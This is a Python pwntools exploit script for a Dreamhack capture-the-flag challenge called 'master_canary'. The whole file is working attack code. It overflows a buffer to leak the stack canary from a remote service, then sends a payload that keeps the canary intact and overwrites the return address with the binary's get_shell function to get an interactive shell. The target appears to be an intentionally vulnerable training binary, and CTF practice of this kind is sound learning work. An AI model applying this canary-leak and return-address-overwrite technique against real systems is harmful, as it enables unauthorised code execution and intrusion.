from pwn import *
import time

p = remote('host8.dreamhack.games', 23593)
e = ELF('/mnt/c/Users/Storm/ctf/master_canary')
get_shell = e.symbols['get_shell']

def create():
    p.sendlineafter(b"> ", b"1")

def input(size, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def exit(comment):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"comment: ", comment)

create()
time.sleep(1)

get_canary = b'A' * 0x8e9
input(len(get_canary), get_canary)

p.recvuntil(get_canary)  
canary = u64(p.recvn(7).rjust(8, b'\x00'))

payload = b'B' * 0x28       
payload += p64(canary)          
payload += b'C' * 8             
payload += p64(get_shell)       

exit(payload)

p.interactive()